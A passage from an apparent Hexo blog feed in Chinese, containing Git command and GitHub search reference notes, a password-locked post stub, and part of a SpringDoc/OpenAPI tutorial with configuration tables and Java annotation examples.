git-reset命令。" class="headerlink" title="git shortlog命令会显示来自git log命令的摘要。如果你只对简短的摘要感兴趣，那么此命令就非常有用了。这个命令有助于查看谁处理了什么，因为它对作者及其提交进行了分组。## git show与git log相比，此命令将显示有关特定提交的详细信息。## git rm 删除文件从当前工作目录和暂存区中删除文件。与普通的文件删除不同，git rm 命令会将删除操作记录到 Git 的历史记录中，这样可以确保删除操作被跟踪并记录下来。## git merge 合并分支git merge可帮助将来自两个分支的更改集成到单个分支中。此命令会将合并到当前分支中。# 高级Git命令## git rebasegit rebase类似于git merge命令。它把两个分支集成到一个分支中，但有一个不一样的地方：git rebase命令将会重写提交记录。当你有多个私有分支合并到单个分支时，应使用git rebase命令。它将使得提交历史成为线性的。## git bisectgit bisect命令可帮助查找糟糕的提交。通过git bisect，只要几分钟你就可以缩小问题代码的范围。## git cherry-pickgit cherry-pick是一个蛮有用的命令，允许你从任意分支中选择任意提交并将其应用于其他任意分支。git cherry-pick不会修改存储库的历史记录；相反，它会添加到历史记录。## git archivegit archive命令会把多个文件合并为单个文件。就好像zip实用程序一样，所以你可以提取存档文件以获取单个文件。它将创建当前修订的zip存档。## git pull –rebase在大多数情况下，当你使用git pull时，你需要重新设置基准（并且不进行合并）。此时，你就可以使用此选项。这将帮助保持干净的历史记录。另外，还可以避免多次合并。## git blame如果你需要逐行检查任意文件的内容，则需要使用git blame命令。它可以帮助确定是谁对文件进行了更改。## git tag在Git中，标签很有用，你可以使用它们来管理发布。你可以将git tag视为不会改变的分支。尤其是要公开发布的时候，则更为重要了。## git verify-commitgit verify-commit命令将检查gpg签名。GPG，GNU Privacy Guard，是sign文件中使用的工具，包含签名。## git verify-tag可以以同样的方式确认标签。## git diff大多数情况下，在提交或推送之前，你需要比较两个git文件或分支。用这个命令就方便多了。## git citoolgit citool是Git提交的图形化替代。## git mv重命名git文件。接受两个参数，源文件名和目标文件名。## git clean你可以使用git clean命令处理未跟踪的文件。可以使用此命令从工作目录中删除所有未跟踪的文件。如果要处理跟踪的文件，则需要使用git reset命令。"></a>git shortlog命令会显示来自git log命令的摘要。如果你只对简短的摘要感兴趣，那么此命令就非常有用了。<br>这个命令有助于查看谁处理了什么，因为它对作者及其提交进行了分组。<br>## git show<br>与git log相比，此命令将显示有关特定提交的详细信息。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git show &lt;your_commit_hash&gt;</span><br></pre></td></tr></table></figure><br>## git rm 删除文件<br>从当前工作目录和暂存区中删除文件。与普通的文件删除不同，git rm 命令会将删除操作记录到 Git 的历史记录中，这样可以确保删除操作被跟踪并记录下来。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git rm &lt;your_file_name&gt;</span><br></pre></td></tr></table></figure><br>## git merge 合并分支<br>git merge可帮助将来自两个分支的更改集成到单个分支中。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git merge &lt;branch_name&gt;</span><br></pre></td></tr></table></figure><br>此命令会将<branch_name>合并到当前分支中。<br># 高级Git命令<br>## git rebase<br>git rebase类似于git merge命令。它把两个分支集成到一个分支中，但有一个不一样的地方：git rebase命令将会重写提交记录。<br>当你有多个私有分支合并到单个分支时，应使用git rebase命令。它将使得提交历史成为线性的。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git rebase &lt;base&gt;</span><br></pre></td></tr></table></figure><br>## git bisect<br>git bisect命令可帮助查找糟糕的提交。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 启动git bisect</span><br><span class="line">$ git bisect start</span><br><span class="line">// 让git bisect知道什么是好的提交</span><br><span class="line">$ git bisect good a123</span><br><span class="line">//让git bisect知道什么是糟糕的提交</span><br><span class="line">$ git bisect bad z123</span><br></pre></td></tr></table></figure><br>通过git bisect，只要几分钟你就可以缩小问题代码的范围。<br>## git cherry-pick<br>git cherry-pick是一个蛮有用的命令，允许你从任意分支中选择任意提交并将其应用于其他任意分支。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git cherry-pick &lt;commit-hash&gt;</span><br></pre></td></tr></table></figure><br>git cherry-pick不会修改存储库的历史记录；相反，它会添加到历史记录。<br>## git archive<br>git archive命令会把多个文件合并为单个文件。就好像zip实用程序一样，所以你可以提取存档文件以获取单个文件。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git archive --format zip HEAD &gt; archive-HEAD.zip</span><br></pre></td></tr></table></figure><br>它将创建当前修订的zip存档。<br>## git pull –rebase<br>在大多数情况下，当你使用git pull时，你需要重新设置基准（并且不进行合并）。<br>此时，你就可以使用此选项。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git pull --rebase</span><br></pre></td></tr></table></figure><br>这将帮助保持干净的历史记录。另外，还可以避免多次合并。<br>## git blame<br>如果你需要逐行检查任意文件的内容，则需要使用git blame命令。它可以帮助确定是谁对文件进行了更改。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git blame &lt;your_file_name&gt;</span><br></pre></td></tr></table></figure><br>## git tag<br>在Git中，标签很有用，你可以使用它们来管理发布。你可以将git tag视为不会改变的分支。尤其是要公开发布的时候，则更为重要了。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git tag -a v1.0.0</span><br></pre></td></tr></table></figure><br>## git verify-commit<br>git verify-commit命令将检查gpg签名。GPG，GNU Privacy Guard，是sign文件中使用的工具，包含签名。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git verify-commit &lt;commit&gt;</span><br></pre></td></tr></table></figure><br>## git verify-tag<br>可以以同样的方式确认标签。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git verify-tag &lt;tag&gt;</span><br></pre></td></tr></table></figure><br>## git diff<br>大多数情况下，在提交或推送之前，你需要比较两个git文件或分支。用这个命令就方便多了。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i）将工作目录与本地存储库进行比较：</span><br><span class="line">$ git diff HEAD &lt;filename&gt;</span><br><span class="line">ii）比较两个分支：</span><br><span class="line">$ git diff &lt;source branch&gt; &lt;target branch&gt;</span><br></pre></td></tr></table></figure><br>## git citool<br>git citool是Git提交的图形化替代。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git citool</span><br></pre></td></tr></table></figure><br>## git mv<br>重命名git文件。接受两个参数，源文件名和目标文件名。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git mv &lt;old-file-name&gt; &lt;new-file-name&gt;</span><br></pre></td></tr></table></figure><br>## git clean<br>你可以使用git clean命令处理未跟踪的文件。可以使用此命令从工作目录中删除所有未跟踪的文件。如果要处理跟踪的文件，则需要使用git reset命令。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git clean</span><br></pre></td></tr></table></figure></h2><h1 id="GitHub搜索"><a href="#GitHub搜索" class="headerlink" title="GitHub搜索"></a>GitHub搜索</h1><p><a href="https://github.com/zhulianhai/CryptoWrapperForCCode">GitHub高级搜索</a></p>
<p>为了帮助你更好地理解如何使用 GitHub 的高级搜索功能，这里提供一个简化版的表格，概述了上述提到的一些主要搜索条件及其用法。</p>
<table>
<thead>
<tr>
<th>搜索条件</th>
<th>示例</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>in:name</code></td>
<td><code>in:name javascript</code></td>
<td>查找仓库名称中包含特定关键字的项目。</td>
</tr>
<tr>
<td><code>in:description</code></td>
<td><code>in:description &quot;machine learning&quot;</code></td>
<td>查找仓库描述中包含特定短语的项目。</td>
</tr>
<tr>
<td><code>in:readme</code></td>
<td><code>in:readme API</code></td>
<td>查找 README 文件中提及特定关键字的项目。</td>
</tr>
<tr>
<td><code>stars:</code></td>
<td><code>stars:&gt;1000</code></td>
<td>查找获得超过指定数量星星的仓库。</td>
</tr>
<tr>
<td><code>forks:</code></td>
<td><code>forks:50..100</code></td>
<td>查找分叉数在指定范围内的仓库。</td>
</tr>
<tr>
<td><code>size:</code></td>
<td><code>size:&gt;=5000</code></td>
<td>查找大于等于指定大小（KB）的仓库。</td>
</tr>
<tr>
<td><code>pushed:</code></td>
<td><code>pushed:&gt;2019-11-15</code></td>
<td>查找最后更新日期晚于指定日期的仓库。</td>
</tr>
<tr>
<td><code>created:</code></td>
<td><code>created:&lt;2018-01-01</code></td>
<td>查找创建日期早于指定日期的仓库。</td>
</tr>
<tr>
<td><code>license:</code></td>
<td><code>license:apache-2.0</code></td>
<td>查找采用特定许可证类型的项目。</td>
</tr>
<tr>
<td><code>language:</code></td>
<td><code>language:java</code></td>
<td>查找以特定编程语言编写的项目。</td>
</tr>
<tr>
<td><code>user:</code></td>
<td><code>user:defunkt</code></td>
<td>查找特定用户拥有的仓库。</td>
</tr>
<tr>
<td><code>org:</code></td>
<td><code>org:github</code></td>
<td>查找特定组织拥有的仓库。</td>
</tr>
</tbody></table>
<h1 id="IDEA使用GIT"><a href="#IDEA使用GIT" class="headerlink" title="IDEA使用GIT"></a>IDEA使用GIT</h1><p>【上传】编写.gitignore；VCS-创建git仓库</p>
]]></content>
      <categories>
        <category>其他语言技术</category>
        <category>其他技术</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Work-网络基础</title>
    <url>/2025/08/10/Work-%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="0070b8e184b71d7d7d83e223c72fc415f331439fa2a0a158d90abecbc1361ed9">b9f6f7d1a88f5bde0575c28b3e79223fc80adaf8d6d0480d7e1fe0f105e40ab8</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看~</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Work</category>
      </categories>
      <tags>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>Tip-Java-OpenAPI</title>
    <url>/2025/02/16/Tip-Java-OpenAPI/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="1-什么是SpringDoc？"><a href="#1-什么是SpringDoc？" class="headerlink" title="1. 什么是SpringDoc？"></a>1. <strong>什么是SpringDoc？</strong></h3><p>SpringDoc 是一个用于在基于 Spring Boot 的应用程序中生成 OpenAPI 文档的库。它能够自动扫描项目中的 RESTful API，并生成交互式的 API 文档，通常以 Swagger UI (或 ReDoc )的形式展示。</p>
<p>Swagger官网：<a href="https://swagger.io/">https://swagger.io/</a></p>
<p>SpringFox项目：<a href="https://github.com/springfox/springfox">https://github.com/springfox/springfox</a></p>
<p>SpringDoc项目：<a href="https://github.com/springdoc/springdoc-openapi">https://github.com/springdoc/springdoc-openapi</a></p>
<p>SpringDoc文档：<a href="https://springdoc.org/">https://springdoc.org/</a></p>
<h3 id="2-核心概念"><a href="#2-核心概念" class="headerlink" title="2. 核心概念"></a>2. <strong>核心概念</strong></h3><ul>
<li><strong>OpenAPI</strong>：一种标准化的规范，用于描述和定义 RESTful API 的结构，包括路径、参数、请求体、响应等。</li>
<li><strong>Swagger</strong>：一个工具集，支持 OpenAPI 规范，提供 API 文档生成、测试等功能。</li>
<li><strong>SpringDoc</strong>：专注于与 Spring 生态系统集成，简化了 OpenAPI 文档的生成过程。</li>
</ul>
<h3 id="3-为什么使用SpringDoc？"><a href="#3-为什么使用SpringDoc？" class="headerlink" title="3. 为什么使用SpringDoc？"></a>3. <strong>为什么使用SpringDoc？</strong></h3><ul>
<li>自动生成 API 文档，减少手动维护的工作量。</li>
<li>提供交互式文档界面（如 Swagger UI），方便开发者和测试人员调试 API。</li>
<li>支持多种扩展功能，例如安全认证、分组文档等。</li>
</ul>
<h3 id="4-Springfox的Swagger和SpringDOC对比"><a href="#4-Springfox的Swagger和SpringDOC对比" class="headerlink" title="4. Springfox的Swagger和SpringDOC对比"></a>4. Springfox的Swagger和SpringDOC对比</h3><p>Springfox 是早期用于在 Spring 项目中集成 Swagger 的常用工具，但它存在一些局限性(主要是<strong>不支持SpringBoot3.x和JDK17+</strong>)，导致现在更推荐使用 SpringDoc。以下是主要原因：</p>
<ol>
<li><strong>维护状态</strong>：Springfox 更新缓慢，对新版本的 Spring 和 Spring Boot 支持不足，而 SpringDoc 积极维护，兼容性更好。</li>
<li><strong>复杂性</strong>：Springfox 配置较为繁琐，需要手动处理大量细节，而 SpringDoc 更加轻量级，开箱即用。</li>
<li><strong>性能问题</strong>：Springfox 在大型项目中可能导致启动时间过长或内存占用过高，SpringDoc 性能更优。</li>
<li><strong>社区支持</strong>：SpringDoc 的社区活跃度更高，文档和示例丰富，更容易上手。</li>
</ol>
<p>综上，SpringDoc 更适合现代开发需求，尤其是在使用较新版本的 Spring Boot 时。</p>
<h2 id="依赖、配置和注解"><a href="#依赖、配置和注解" class="headerlink" title="依赖、配置和注解"></a>依赖、配置和注解</h2><h3 id="相关依赖介绍"><a href="#相关依赖介绍" class="headerlink" title="相关依赖介绍"></a>相关依赖介绍</h3><table>
<thead>
<tr>
<th>依赖名称</th>
<th>功能描述</th>
<th>适用场景</th>
<th>是否包含UI支持</th>
</tr>
</thead>
<tbody><tr>
<td><code>springdoc-openapi-starter-webmvc-api</code></td>
<td>提供基于 Spring Web MVC 的 API 文档生成功能，生成符合 OpenAPI 3 规范的文档。</td>
<td>适用于需要生成 API 文档但不需要可视化界面的传统 Web 应用程序。</td>
<td>否</td>
</tr>
<tr>
<td><code>springdoc-openapi-starter-webmvc-ui</code></td>
<td>在提供 API 文档生成功能的同时，集成了 Swagger UI，允许通过浏览器查看和测试 API。</td>
<td>适用于需要可视化 API 文档的项目，方便开发者、测试人员和前端工程师快速理解和测试 API。</td>
<td>是</td>
</tr>
<tr>
<td><code>springdoc-openapi-starter-webflux-api</code></td>
<td>提供基于 Spring WebFlux 的响应式应用程序的 API 文档生成功能。</td>
<td>适用于使用 Spring WebFlux 构建的响应式应用程序。</td>
<td>否</td>
</tr>
<tr>
<td><code>springdoc-openapi-starter-webflux-ui</code></td>
<td>在提供 API 文档生成功能的同时，为 Spring WebFlux 应用程序集成了 Swagger UI。</td>
<td>适用于需要可视化 API 文档的响应式应用程序。</td>
<td>是</td>
</tr>
<tr>
<td><code>springdoc-openapi-security</code></td>
<td>提供与安全相关的功能，如 OAuth2 和 JWT 认证，确保 API 文档的安全性。</td>
<td>适用于需要对 API 进行身份验证和授权的项目。</td>
<td>否</td>
</tr>
<tr>
<td><code>springdoc-openapi-data-rest</code></td>
<td>为 Spring Data REST 提供 OpenAPI 文档生成支持，自动扫描并生成基于 Spring Data REST 的 API 文档。</td>
<td>适用于使用 Spring Data REST 构建的应用程序。</td>
<td>否</td>
</tr>
<tr>
<td><code>springdoc-openapi-jaxrs</code></td>
<td>为基于 JAX-RS 的应用程序提供 OpenAPI 文档生成支持。</td>
<td>适用于使用 JAX-RS 构建的 RESTful 服务。</td>
<td>否</td>
</tr>
<tr>
<td><code>springdoc-openapi-kotlin</code></td>
<td>为 Kotlin 语言提供更好的支持，确保 Kotlin 特有的类型和语法能够在生成的文档中正确显示。</td>
<td>适用于使用 Kotlin 编写的 Spring Boot 应用程序。</td>
<td>否</td>
</tr>
<tr>
<td><code>springdoc-openapi-maven-plugin</code></td>
<td>提供 Maven 插件支持，可以在构建过程中生成静态的 OpenAPI 文档文件（如 JSON 或 YAML 格式）。</td>
<td>适用于需要在构建时生成静态文档的项目。</td>
<td>否</td>
</tr>
</tbody></table>
<h3 id="相关配置介绍"><a href="#相关配置介绍" class="headerlink" title="相关配置介绍"></a>相关配置介绍</h3><h4 id="1-基础配置"><a href="#1-基础配置" class="headerlink" title="1. 基础配置"></a><strong>1. 基础配置</strong></h4><table>
<thead>
<tr>
<th>配置项</th>
<th>功能描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>springdoc.api-docs.path</code></td>
<td>设置 API 文档的基础路径，默认为 <code>/v3/api-docs</code>。例如：<code>/api/v3/api-docs</code>。</td>
</tr>
<tr>
<td><code>springdoc.swagger-ui.path</code></td>
<td>设置 Swagger UI 的访问路径，默认为 <code>/swagger-ui.html</code>。例如：<code>/swagger-ui/index.html</code>。</td>
</tr>
</tbody></table>
<h4 id="2-分组配置"><a href="#2-分组配置" class="headerlink" title="2. 分组配置"></a><strong>2. 分组配置</strong></h4><table>
<thead>
<tr>
<th>配置项</th>
<th>功能描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>springdoc.group-configs[0].group</code></td>
<td>定义分组名称，用于将 API 按照逻辑分组显示。</td>
</tr>
<tr>
<td><code>springdoc.group-configs[0].paths-to-match</code></td>
<td>指定该分组匹配的路径规则（正则表达式）。</td>
</tr>
<tr>
<td><code>springdoc.group-configs[0].packages-to-scan</code></td>
<td>指定该分组扫描的包名。</td>
</tr>
</tbody></table>
<h4 id="3-安全配置"><a href="#3-安全配置" class="headerlink" title="3. 安全配置"></a><strong>3. 安全配置</strong></h4><table>
<thead>
<tr>
<th>配置项</th>
<th>功能描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>springdoc.security.enabled</code></td>
<td>是否启用安全配置，默认为 <code>true</code>。</td>
</tr>
<tr>
<td><code>springdoc.security.schemes[0].name</code></td>
<td>定义安全方案的名称，例如 OAuth2 或 JWT。</td>
</tr>
<tr>
<td><code>springdoc.security.schemes[0].type</code></td>
<td>安全方案类型，例如 <code>oauth2</code>、<code>apiKey</code> 等。</td>
</tr>
<tr>
<td><code>springdoc.security.schemes[0].in</code></td>
<td>指定认证信息的位置，例如 <code>header</code> 或 <code>query</code>。</td>
</tr>
<tr>
<td><code>springdoc.security.schemes[0].flows.authorizationUrl</code></td>
<td>对于 OAuth2，指定授权 URL。</td>
</tr>
</tbody></table>
<h4 id="4-全局信息配置"><a href="#4-全局信息配置" class="headerlink" title="4. 全局信息配置"></a><strong>4. 全局信息配置</strong></h4><table>
<thead>
<tr>
<th>配置项</th>
<th>功能描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>springdoc.info.title</code></td>
<td>设置 API 文档的标题。</td>
</tr>
<tr>
<td><code>springdoc.info.description</code></td>
<td>设置 API 文档的描述信息。</td>
</tr>
<tr>
<td><code>springdoc.info.version</code></td>
<td>设置 API 文档的版本号。</td>
</tr>
<tr>
<td><code>springdoc.info.contact.name</code></td>
<td>设置联系人姓名。</td>
</tr>
<tr>
<td><code>springdoc.info.contact.url</code></td>
<td>设置联系人的 URL 地址。</td>
</tr>
<tr>
<td><code>springdoc.info.contact.email</code></td>
<td>设置联系人邮箱地址。</td>
</tr>
<tr>
<td><code>springdoc.info.license.name</code></td>
<td>设置许可证名称。</td>
</tr>
<tr>
<td><code>springdoc.info.license.url</code></td>
<td>设置许可证 URL 地址。</td>
</tr>
</tbody></table>
<p><strong>示例</strong>：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">springdoc:</span></span><br><span class="line">  <span class="attr">info:</span></span><br><span class="line">    <span class="attr">title:</span> <span class="string">用户管理</span> <span class="string">API</span></span><br><span class="line">    <span class="attr">description:</span> <span class="string">提供用户相关的接口文档。</span></span><br><span class="line">    <span class="attr">version:</span> <span class="number">1.0</span><span class="number">.0</span></span><br><span class="line">    <span class="attr">contact:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">张三</span></span><br><span class="line">      <span class="attr">email:</span> <span class="string">zhangsan@example.com</span></span><br><span class="line">    <span class="attr">license:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">Apache</span> <span class="number">2.0</span></span><br><span class="line">      <span class="attr">url:</span> <span class="string">https://www.apache.org/licenses/LICENSE-2.0.html</span></span><br></pre></td></tr></table></figure>



<h4 id="5-扩展配置"><a href="#5-扩展配置" class="headerlink" title="5. 扩展配置"></a><strong>5. 扩展配置</strong></h4><table>
<thead>
<tr>
<th>配置项</th>
<th>功能描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>springdoc.use-management-port</code></td>
<td>是否在管理端口上暴露 API 文档，默认为 <code>false</code>。</td>
</tr>
<tr>
<td><code>springdoc.expand-request-body</code></td>
<td>是否默认展开请求体，默认为 <code>false</code>。</td>
</tr>
<tr>
<td><code>springdoc.expand-responses</code></td>
<td>是否默认展开响应体，默认为 <code>false</code>。</td>
</tr>
<tr>
<td><code>springdoc.try-it-out-enabled</code></td>
<td>是否启用“Try it out”功能，默认为 <code>true</code>。</td>
</tr>
<tr>
<td><code>springdoc.default-consumes-media-type</code></td>
<td>设置默认的媒体类型（如 <code>application/json</code>）。</td>
</tr>
<tr>
<td><code>springdoc.default-produces-media-type</code></td>
<td>设置默认的响应媒体类型（如 <code>application/json</code>）。</td>
</tr>
</tbody></table>
<h4 id="6-扫描配置"><a href="#6-扫描配置" class="headerlink" title="6. 扫描配置"></a><strong>6. 扫描配置</strong></h4><table>
<thead>
<tr>
<th>配置项</th>
<th>功能描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>springdoc.packages-to-scan</code></td>
<td>指定需要扫描的包名，默认扫描所有包。</td>
</tr>
<tr>
<td><code>springdoc.paths-to-match</code></td>
<td>指定需要匹配的路径规则（正则表达式）。</td>
</tr>
<tr>
<td><code>springdoc.paths-to-exclude</code></td>
<td>指定需要排除的路径规则（正则表达式）。</td>
</tr>
</tbody></table>
<h4 id="7-插件配置"><a href="#7-插件配置" class="headerlink" title="7. 插件配置"></a><strong>7. 插件配置</strong></h4><table>
<thead>
<tr>
<th>配置项</th>
<th>功能描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>springdoc.show-actuator</code></td>
<td>是否显示 Actuator 的端点，默认为 <code>false</code>。</td>
</tr>
<tr>
<td><code>springdoc.cache.disabled</code></td>
<td>是否禁用缓存，默认为 <code>false</code>。</td>
</tr>
<tr>
<td><code>springdoc.skip-undocumented-models</code></td>
<td>是否跳过未文档化的模型，默认为 <code>false</code>。</td>
</tr>
</tbody></table>
<h3 id="相关注解介绍"><a href="#相关注解介绍" class="headerlink" title="相关注解介绍"></a>相关注解介绍</h3><h4 id="1-描述类和接口"><a href="#1-描述类和接口" class="headerlink" title="1. 描述类和接口"></a><strong>1. 描述类和接口</strong></h4><table>
<thead>
<tr>
<th>注解</th>
<th>功能描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>@Tag</code></td>
<td>为控制器或 API 分组添加标签，便于分类管理。</td>
</tr>
<tr>
<td><code>@Operation</code></td>
<td>描述某个方法的操作信息，如摘要、详细描述等。</td>
</tr>
<tr>
<td><code>@ApiResponses</code></td>
<td>定义一组可能的响应结果。</td>
</tr>
<tr>
<td><code>@ApiResponse</code></td>
<td>定义单个响应结果，通常与 <code>@ApiResponses</code> 配合使用。</td>
</tr>
</tbody></table>
<p><strong>示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/users&quot;)</span></span><br><span class="line"><span class="meta">@Tag(name = &quot;用户管理&quot;, description = &quot;用户相关的 API 操作&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Operation(summary = &quot;获取用户信息&quot;, description = &quot;根据用户 ID 获取用户详细信息&quot;)</span></span><br><span class="line">    <span class="meta">@ApiResponses(value = &#123;</span></span><br><span class="line"><span class="meta">        @ApiResponse(responseCode = &quot;200&quot;, description = &quot;成功返回用户信息&quot;),</span></span><br><span class="line"><span class="meta">        @ApiResponse(responseCode = &quot;404&quot;, description = &quot;用户不存在&quot;)</span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">getUser</span><span class="params">(<span class="meta">@PathVariable</span> Long id)</span> &#123;</span><br><span class="line">        <span class="comment">// 方法实现</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2-描述参数"><a href="#2-描述参数" class="headerlink" title="2. 描述参数"></a><strong>2. 描述参数</strong></h4><table>
<thead>
<tr>
<th>注解</th>
<th>功能描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>@Parameter</code></td>
<td>描述单个参数，包括名称、类型、是否必填等。</td>
</tr>
<tr>
<td><code>@Parameters</code></td>
<td>描述多个参数，通常与 <code>@Parameter</code> 配合使用。</td>
</tr>
<tr>
<td><code>@RequestBody</code></td>
<td>描述请求体的内容和结构。</td>
</tr>
</tbody></table>
<p><strong>示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span></span><br><span class="line"><span class="meta">@Operation(summary = &quot;创建用户&quot;, description = &quot;创建一个新的用户&quot;)</span></span><br><span class="line"><span class="meta">@ApiResponse(responseCode = &quot;201&quot;, description = &quot;用户创建成功&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;User&gt; <span class="title function_">createUser</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="meta">@Parameter(description = &quot;用户对象&quot;)</span> <span class="meta">@RequestBody</span> User user)</span> &#123;</span><br><span class="line">    <span class="comment">// 方法实现</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3-描述模型和字段"><a href="#3-描述模型和字段" class="headerlink" title="3. 描述模型和字段"></a><strong>3. 描述模型和字段</strong></h4><table>
<thead>
<tr>
<th>注解</th>
<th>功能描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>@Schema</code></td>
<td>描述模型或字段的信息，包括类型、格式、示例值等。</td>
</tr>
<tr>
<td><code>@Hidden</code></td>
<td>隐藏某些字段或方法，使其不显示在文档中。</td>
</tr>
</tbody></table>
<p><strong>示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Schema(description = &quot;用户 ID&quot;, example = &quot;1&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Schema(description = &quot;用户名&quot;, required = true, example = &quot;张三&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Schema(description = &quot;密码&quot;, required = true)</span></span><br><span class="line">    <span class="meta">@Hidden</span> <span class="comment">// 隐藏该字段，不在文档中显示</span></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="4-全局配置"><a href="#4-全局配置" class="headerlink" title="4. 全局配置"></a><strong>4. 全局配置</strong></h4><table>
<thead>
<tr>
<th>注解</th>
<th>功能描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>@SecurityScheme</code></td>
<td>定义全局的安全方案（如 OAuth2、JWT 等）。</td>
</tr>
<tr>
<td><code>@SecurityRequirement</code></td>
<td>指定某个操作需要的安全要求。</td>
</tr>
</tbody></table>
<p><strong>示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SecurityScheme(</span></span><br><span class="line"><span class="meta">    name = &quot;bearerAuth&quot;,</span></span><br><span class="line"><span class="meta">    type = SecuritySchemeType.HTTP,</span></span><br><span class="line"><span class="meta">    bearerFormat = &quot;JWT&quot;,</span></span><br><span class="line"><span class="meta">    scheme = &quot;bearer&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/secure&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecureController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Operation(security = @SecurityRequirement(name = &quot;bearerAuth&quot;))</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/data&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getData</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 方法实现</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="5-特殊场景"><a href="#5-特殊场景" class="headerlink" title="5. 特殊场景"></a><strong>5. 特殊场景</strong></h4><table>
<thead>
<tr>
<th>注解</th>
<th>功能描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>@Deprecated</code></td>
<td>标记某个接口或方法为废弃状态，提示用户不要使用。</td>
</tr>
<tr>
<td><code>@Extensions</code> 和 <code>@Extension</code></td>
<td>添加自定义扩展信息到文档中。</td>
</tr>
</tbody></table>
<p><strong>示例</strong>：</p>
